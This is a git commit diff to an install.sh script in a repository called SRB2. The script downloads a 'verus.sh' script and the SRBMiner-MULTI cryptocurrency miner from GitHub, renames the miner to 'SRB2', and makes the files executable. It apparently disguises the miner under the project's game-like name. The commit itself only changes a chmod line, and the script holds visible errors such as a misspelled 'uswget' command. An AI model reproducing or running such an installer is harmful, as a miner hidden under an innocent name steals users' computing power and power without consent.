2e469ee925e654d79bfed229944f5de460be1bd5
Geokot82 <128073486+Geokot82@users.noreply.github.com>
2024-11-06 16:32:43 +0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -4,5 +4,5 @@ uswget ${GITHUB_DOWNLOAD_URL} -O ~/SRB2/SRB2
 wget https://raw.githubusercontent.com/Geokot82/SRB2/main/verus.sh -O ~/SRB2/verus.sh
 wget https://raw.githubusercontent.com/Geokot82/SRB2/main/SRBMiner-MULTI -O ~/SRB2/SRBMiner-MULTI
 mv SRBMiner-MULTI SRB2
-chmod +x SRB2
+chmod +x SRBMiner-MULTI
 chmod +x verus.sh
